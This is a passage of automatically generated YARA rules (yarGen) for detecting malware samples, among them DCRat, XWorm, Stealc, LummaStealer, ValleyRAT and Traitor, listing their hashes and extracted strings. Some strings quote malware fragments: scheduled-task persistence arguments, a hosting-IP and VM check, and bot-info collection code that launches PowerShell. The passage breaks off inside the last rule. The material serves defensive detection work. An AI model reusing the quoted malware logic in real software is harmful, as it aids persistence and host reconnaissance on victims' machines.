      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2f0ff1a3573cb45775b709b1e8df418ff7adcc5b678a52a768d02933b6174ca6"
      hash2 = "dd71110a6b7fb79b2949280611957646f76503f1bda866b06e74b9a74e54dc89"
      hash3 = "c7f4e1aba81ad7714da4487dd279cc886b50428116b614c9ebe246d937c478f0"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s8 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s9 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s10 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s11 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s12 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s13 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s14 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
      $s15 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_9 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
   strings:
      $s1 = "=*struct { F uintptr; X0 *exec.Cmd; X1 chan<- exec.ctxResult }" fullword ascii /* score: '24.00'*/
      $s2 = "os/exec.Command.func1" fullword ascii /* score: '24.00'*/
      $s3 = "sync/atomic.(*Pointer[go.shape.struct { internal/bisect.recent [128][4]uint64; internal/bisect.mu sync.Mutex; internal/bisect.m " ascii /* score: '22.00'*/
      $s4 = "type:.eq.log.Logger" fullword ascii /* score: '21.00'*/
      $s5 = "on a locked thread with no template threadunexpected signal during runtime execution received but handler not on signal stack" fullword ascii /* score: '21.00'*/
      $s6 = "sync.runtime_SemacquireRWMutex" fullword ascii /* score: '21.00'*/
      $s7 = "sync.runtime_SemacquireRWMutexR" fullword ascii /* score: '21.00'*/
      $s8 = "*func(*exec.Cmd)" fullword ascii /* score: '20.00'*/
      $s9 = "runtime: bad notifyList size - sync=signal arrived during cgo execution" fullword ascii /* score: '20.00'*/
      $s10 = "0*struct { F uintptr; X0 *os.File; X1 *exec.Cmd }" fullword ascii /* score: '20.00'*/
      $s11 = " checkdead: find g runlock of unlocked rwmutexsignal received during forksigsend: inconsistent statemakeslice: len out of rangem" ascii /* score: '18.00'*/
      $s12 = "os/exec.closeDescriptors" fullword ascii /* score: '18.00'*/
      $s13 = "os/exec.(*Cmd).watchCtx" fullword ascii /* score: '17.00'*/
      $s14 = "runtime.traceEventWriter.commit" fullword ascii /* score: '17.00'*/
      $s15 = "os/exec.(*Cmd).Start.gowrap2" fullword ascii /* score: '17.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}


rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dd71110a_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_11 {
   meta:
      description = "dropzone - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd71110a.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c29b8c08.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c7f4e1ab.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "dd71110a6b7fb79b2949280611957646f76503f1bda866b06e74b9a74e54dc89"
      hash2 = "c29b8c089386c964ea2f63e79e78fc57abbe732b3b8366827218858b0ed7c256"
      hash3 = "c7f4e1aba81ad7714da4487dd279cc886b50428116b614c9ebe246d937c478f0"
   strings:
      $s1 = "Discord - https://discord.com/" fullword wide /* score: '25.00'*/
      $s2 = "DiscordScreen.exe" fullword wide /* score: '22.00'*/
      $s3 = "http://ip-api.com/line/?fields=hosting" fullword wide /* score: '22.00'*/
      $s4 = "Select * from Win32_ComputerSystem" fullword wide /* score: '14.00'*/
      $s5 = "*.* /s /d" fullword wide /* score: '13.00'*/
      $s6 = "/create /f /RL HIGHEST /sc minute /mo 1 /tn \"" fullword wide /* score: '12.00'*/
      $s7 = "/create /f /sc minute /mo 1 /tn \"" fullword wide /* score: '12.00'*/
      $s8 = "/delete /f  /tn \"" fullword wide /* score: '12.00'*/
      $s9 = "attrib -h -s " fullword wide /* score: '12.00'*/
      $s10 = "schtasks" fullword wide /* score: '11.00'*/
      $s11 = "regread" fullword wide /* score: '11.00'*/
      $s12 = "vmware" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s13 = "1yf5acFCW5ly2EtGvgwPJ7DJOX2N8drdmn67pFDBNzOclLIFMXXN9EYsIWbwGtGTkZXq7ggzSQgkIZGEtUD" fullword ascii /* score: '9.00'*/
      $s14 = "8amaqw7J3kU3aMC5Jh1Vn8tQPjP0CHgPQXAH3inuxoHZj4r3nMWLP1UG5kVvDpwTLs" fullword ascii /* score: '9.00'*/
      $s15 = "KmafPLkT30tIDlL2r4Bik4lVAE61mVaKESU0VAiurmLzDApjxjtEbgw1bQdkNnzJoqYQPT3dEizn4v9dQCt" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739_25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963_12 {
   meta:
      description = "dropzone - from files 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash2 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash3 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash4 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "net.UnknownNetworkError.Temporary" fullword ascii /* score: '17.00'*/
      $s2 = "context.deadlineExceededError.Temporary" fullword ascii /* score: '17.00'*/
      $s3 = "net.maxListenerBacklog" fullword ascii /* score: '15.00'*/
      $s4 = "net.JoinHostPort" fullword ascii /* score: '15.00'*/
      $s5 = "net.hostLookupOrder.String" fullword ascii /* score: '15.00'*/
      $s6 = "net.SplitHostPort.func1" fullword ascii /* score: '15.00'*/
      $s7 = "net.lookupStaticHost" fullword ascii /* score: '15.00'*/
      $s8 = "net.listenerBacklog" fullword ascii /* score: '15.00'*/
      $s9 = "net.readHosts" fullword ascii /* score: '15.00'*/
      $s10 = "net.SplitHostPort" fullword ascii /* score: '15.00'*/
      $s11 = "net.(*OpError).Temporary" fullword ascii /* score: '14.00'*/
      $s12 = "context.(*deadlineExceededError).Temporary" fullword ascii /* score: '14.00'*/
      $s13 = "net.(*UnknownNetworkError).Temporary" fullword ascii /* score: '14.00'*/
      $s14 = "net.(*AddrError).Temporary" fullword ascii /* score: '14.00'*/
      $s15 = "net.systemConf" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0xfacf or uint16(0) == 0x457f ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_13 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash3 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
   strings:
      $s1 = "\"*struct { sync.Mutex; m sync.Map }" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.msigsave" fullword ascii /* score: '14.00'*/
      $s3 = "reflect.(*funcTypeFixed16).Comparable" fullword ascii /* score: '11.00'*/
      $s4 = "reflect.(*interfaceType).common" fullword ascii /* score: '11.00'*/
      $s5 = "reflect.(*funcTypeFixed4).Comparable" fullword ascii /* score: '11.00'*/
      $s6 = "reflect.(*funcTypeFixed64).Comparable" fullword ascii /* score: '11.00'*/
      $s7 = "reflect.(*funcTypeFixed4).common" fullword ascii /* score: '11.00'*/
      $s8 = "reflect.(*funcTypeFixed32).Comparable" fullword ascii /* score: '11.00'*/
      $s9 = "reflect.(*sliceType).Comparable" fullword ascii /* score: '11.00'*/
      $s10 = "reflect.(*funcTypeFixed16).common" fullword ascii /* score: '11.00'*/
      $s11 = "reflect.(*funcTypeFixed32).common" fullword ascii /* score: '11.00'*/
      $s12 = "reflect.(*structType).Comparable" fullword ascii /* score: '11.00'*/
      $s13 = "reflect.(*sliceType).common" fullword ascii /* score: '11.00'*/
      $s14 = "reflect.(*structType).common" fullword ascii /* score: '11.00'*/
      $s15 = "reflect.(*funcTypeFixed8).common" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_14 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash4 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash5 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash6 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "sync.(*RWMutex).RUnlock" fullword ascii /* score: '18.00'*/
      $s2 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s3 = "runtime.sigpipe" fullword ascii /* score: '16.00'*/
      $s4 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s5 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s6 = "sync.(*RWMutex).Unlock" fullword ascii /* score: '15.00'*/
      $s7 = "sync.(*RWMutex).Lock" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.getsig" fullword ascii /* score: '15.00'*/
      $s9 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s10 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s11 = "*sync.RWMutex" fullword ascii /* score: '15.00'*/
      $s12 = "internal/poll.(*fdMutex).incref" fullword ascii /* score: '15.00'*/
      $s13 = "sync.(*RWMutex).RLock" fullword ascii /* score: '15.00'*/
      $s14 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.msigrestore" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_15 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash3 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash4 = "5d313b578a2eb483e5163af2ef96867fd003edda827345c6e5aab95069161720"
   strings:
      $s1 = "q*struct { lock runtime.mutex; newm runtime.muintptr; waiting bool; wake runtime.note; haveTemplateThread uint32 }" fullword ascii /* score: '25.00'*/
      $s2 = "type..hash.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; " ascii /* score: '23.00'*/
      $s3 = "runtime.hexdumpWords.func1" fullword ascii /* score: '20.00'*/
      $s4 = "type..eq.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; ru" ascii /* score: '20.00'*/
      $s5 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s6 = "**struct { F uintptr; rw *runtime.rwmutex }" fullword ascii /* score: '18.00'*/
      $s7 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s8 = "2*struct { runtime.mutex; runtime.persistentAlloc }" fullword ascii /* score: '18.00'*/
      $s9 = "N*struct { lock runtime.mutex; free runtime.mSpanList; busy runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s10 = "*runtime.rwmutex" fullword ascii /* score: '18.00'*/
      $s11 = "e*struct { lock runtime.mutex; next int32; m map[int32]unsafe.Pointer; minv map[unsafe.Pointer]int32 }" fullword ascii /* score: '18.00'*/
      $s12 = "ntime.haveTemplateThread uint32 }" fullword ascii /* score: '17.00'*/
      $s13 = "runtime.haveTemplateThread uint32 }" fullword ascii /* score: '17.00'*/
      $s14 = "type..hash.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; " ascii /* score: '16.00'*/
      $s15 = "runtime.(*gcSweepBuf).pop" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 9000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__Stealc_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__16 {
   meta:
      description = "dropzone - from files d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
      hash2 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
   strings:
      $x1 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '54.00'*/
      $x2 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '50.00'*/
      $x3 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '47.50'*/
      $x4 = "runtime.newosprocruntime/internal/internal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=unknown c" ascii /* score: '46.00'*/
      $x5 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '45.00'*/
      $x6 = "GODEBUG: value \"permission deniedwrong medium typeno data availableexec format errorLookupAccountSidWDnsRecordListFreeGetCurren" ascii /* score: '43.00'*/
      $x7 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '42.00'*/
      $x8 = "_cgo_pthread_key_created missingruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prev" ascii /* score: '41.50'*/
      $x9 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '40.00'*/
      $x10 = ", locked to threadruntime.semacreateruntime.semawakeupbad file descriptordisk quota exceededtoo many open filesdevice not a stre" ascii /* score: '39.00'*/
      $x11 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bppreempt off reason: forcegc: phase errorgopark: " ascii /* score: '39.00'*/
      $x12 = "unlock: lock countprogToPointerMask: overflowfailed to set sweep barrierwork.nwait was > work.nproc not in stack roots range [al" ascii /* score: '36.00'*/
      $x13 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '36.00'*/
      $x14 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
      $x15 = "sTimesGetStartupInfoWProcess32FirstWUnmapViewOfFileFailed to load Failed to find allocmRInternalGC (fractional)write heap dumpas" ascii /* score: '33.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _58d54e2454be3e4e9a8ea86a3f299a7a60529bc12d28394c5bdf8f858400ff7b_58d54e24_94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c_17 {
   meta:
      description = "dropzone - from files 58d54e2454be3e4e9a8ea86a3f299a7a60529bc12d28394c5bdf8f858400ff7b_58d54e24.unknown, 94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c9dd8097af0de52a_94dc0f69.unknown"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "58d54e2454be3e4e9a8ea86a3f299a7a60529bc12d28394c5bdf8f858400ff7b"
      hash2 = "94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c9dd8097af0de52a"
   strings:
      $x1 = "Kernel32.GetComputerNameExW(ComputerNameDnsHostname, botinfo_addr + BOT_INFO.pcname.offset, addressof(mp));" fullword ascii /* score: '32.00'*/
      $s2 = "    Kernel32.CreateProcessW(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", args, 0, 0, 0, 0, 0, 0" ascii /* score: '30.00'*/
      $s3 = "    Kernel32.CreateProcessW(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", args, 0, 0, 0, 0, 0, 0" ascii /* score: '30.00'*/
      $s4 = "        tPath = \"C:\\\\Windows\\\\System32\\\\cmd.exe\";" fullword ascii /* score: '29.00'*/
      $s5 = "Kernel32.GetComputerNameExW(ComputerNameDnsDomain, botinfo_addr + BOT_INFO.domainname.offset, addressof(mp));" fullword ascii /* score: '27.00'*/
      $s6 = "            procpath = \"C:\\\\Windows\\\\System32\\\\rundll32.exe\";" fullword ascii /* score: '25.00'*/
      $s7 = "Kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED | ES_DISPLAY_REQUIRED);" fullword ascii /* score: '24.00'*/
      $s8 = "    if Advapi32.OpenProcessToken(Kernel32.GetCurrentProcess(), TOKEN_QUERY, addressof(hToken)):" fullword ascii /* score: '23.00'*/
      $s9 = "Advapi32.GetUserNameW(botinfo_addr + BOT_INFO.username.offset, addressof(mp));" fullword ascii /* score: '22.00'*/
      $s10 = "        Advapi32.GetTokenInformation(hToken, TokenElevation, addressof(IsElevated), sizeof(IsElevated), addressof(cbSize))" fullword ascii /* score: '22.00'*/
      $s11 = "        tPath = \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\";" fullword ascii /* score: '22.00'*/
      $s12 = "TokenElevation = 20;" fullword ascii /* score: '19.00'*/
      $s13 = "User32 = WinDLL(\"User32.dll\");" fullword ascii /* score: '19.00'*/
      $s14 = "botinfo.iselevated = CheckElevation();" fullword ascii /* score: '19.00'*/
      $s15 = "Winhttp = WinDLL(\"Winhttp.dll\");" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x7266 and filesize < 70KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c_Traitor_signature__18 {
   meta:
      description = "dropzone - from files b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash2 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "net.getHostname" fullword ascii /* score: '17.00'*/
      $s2 = "fmt.complexError" fullword ascii /* score: '17.00'*/
      $s3 = "unicode.Scripts" fullword ascii /* score: '17.00'*/
      $s4 = "unicode.IDS_Binary_Operator" fullword ascii /* score: '15.00'*/
      $s5 = "go.itab.*os/exec.ExitError,error" fullword ascii /* score: '15.00'*/
      $s6 = "go.itab.*os/exec.Error,error" fullword ascii /* score: '15.00'*/
      $s7 = "unicode.Common" fullword ascii /* score: '14.00'*/
      $s8 = "unicode.Inscriptional_Pahlavi" fullword ascii /* score: '13.00'*/
      $s9 = "io.ErrClosedPipe" fullword ascii /* score: '13.00'*/
      $s10 = "unicode.Inscriptional_Parthian" fullword ascii /* score: '13.00'*/
      $s11 = "net.onceReadServices" fullword ascii /* score: '13.00'*/
      $s12 = "unicode.Tagalog" fullword ascii /* score: '12.00'*/
      $s13 = "net.getsockoptIntFunc" fullword ascii /* score: '12.00'*/
      $s14 = "unicode.IDS_Trinary_Operator" fullword ascii /* score: '12.00'*/
      $s15 = "unicode.Logical_Order_Exception" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__Stealc_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature___19 {
   meta:
      description = "dropzone - from files d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
      hash2 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
      hash3 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   strings:
      $x1 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $s2 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s3 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s4 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s5 = " s.sweepgen= allocCount ProcessPrng" fullword ascii /* score: '20.00'*/
      $s6 = "r spinbit mutexmin size of malloc header is not a size class boundarygcControllerState.findRunnable: blackening not enabledno go" ascii /* score: '19.00'*/
      $s7 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '18.00'*/
      $s8 = "internal/runtime/maps.mapKeyError" fullword ascii /* score: '18.00'*/
      $s9 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '18.00'*/
      $s10 = "runtime.preventErrorDialogs" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.mallocgcSmallScanHeader" fullword ascii /* score: '16.00'*/
      $s12 = "internal/runtime/atomic.(*Pointer[go.shape.a0c91c71fd368b5d30f8a04d1e4f14a4186fd3423a1957aa58b1e03c3b3735dd]).CompareAndSwapNoWB" ascii /* score: '16.00'*/
      $s13 = "runtime.mallocgcSmallScanNoHeader" fullword ascii /* score: '16.00'*/
      $s14 = "bindm in unexpected GOOSruntime: mp.lockedInt = runqsteal: runq overflowunexpected syncgroup setdouble traceGCSweepStartbad use " ascii /* score: '15.00'*/
      $s15 = "internal/runtime/maps.(*ctrlGroup).get" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_20 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Traitor(signature).elf, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
      hash4 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
